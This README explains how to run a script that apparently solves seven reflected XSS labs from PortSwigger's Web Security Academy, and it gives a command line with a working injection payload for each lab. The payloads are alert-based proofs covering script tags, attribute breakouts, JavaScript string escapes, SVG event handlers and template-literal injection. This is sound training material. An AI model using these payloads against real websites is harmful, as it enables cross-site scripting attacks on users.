# How to run script.py

## The labs that script.py is valid are the following:

### 1. Reflected XSS into HTML context with nothing encoded

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<script>alert('XSS')</script>"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<script>alert('XSS')</script>" -p 127.0.0.1:8080`

### 2. Reflected XSS into attribute with angle brackets HTML-encoded

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "\" autofocus onfocus=alert('XSS') x=\""`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "\" autofocus onfocus=alert('XSS') x=\"" -p 127.0.0.1:8080`

### 3. Reflected XSS into a JavaScript string with angle brackets HTML encoded

### 3.1 ';-alert('XSS')'

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "';-alert('XSS')-'"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "';-alert('XSS')-'" -p 127.0.0.1:8080`

### 3.2 ';alert('XSS')//

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "';alert('XSS')//"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "';alert('XSS')//" -p 127.0.0.1:8080`

### 4. Reflected XSS into a JavaScript string with single quote and backslash escaped

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "</script><script>alert(1)</script>"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "</script><script>alert(1)</script>" -p 127.0.0.1:8080`

### 5. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "\';alert(1)//"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "\';alert(1)//" -p 127.0.0.1:8080`

### 6. Reflected XSS with some SVG markup allowed

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<svg><animatetransform onbegin=alert('XSS') attributeName=transform>"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<svg><animatetransform onbegin=alert('XSS') attributeName=transform>" -p 127.0.0.1:8080`

### 7. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "\${alert(document.domain)}"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "\${alert(document.domain)}" -p 127.0.0.1:8080`
